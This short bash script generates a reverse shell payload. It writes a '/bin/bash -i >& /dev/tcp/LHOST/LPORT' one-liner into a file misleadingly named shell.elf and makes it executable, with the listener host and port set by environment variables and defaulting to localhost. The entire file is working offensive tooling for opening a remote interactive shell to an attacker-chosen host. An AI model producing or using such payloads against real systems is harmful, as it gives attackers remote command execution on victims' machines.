#!/bin/bash
# build_payload.sh: Generate a simple Linux reverse shell payload
# Usage: LHOST=127.0.0.1 LPORT=4444 ./build_payload.sh

set -e
set -o pipefail

PAYLOAD_DIR="$(dirname "$0")/../payloads"
OUTPUT="$PAYLOAD_DIR/shell.elf"
LHOST="${LHOST:-127.0.0.1}"
LPORT="${LPORT:-4444}"

mkdir -p "$PAYLOAD_DIR"

{
    echo "[INFO] Generating bash reverse shell payload for $LHOST:$LPORT..."
    echo "/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > "$OUTPUT"
    chmod +x "$OUTPUT"
    echo "[INFO] Payload written to $OUTPUT"
} || {
    echo "[ERROR] Failed to generate payload" >&2
    exit 1
} 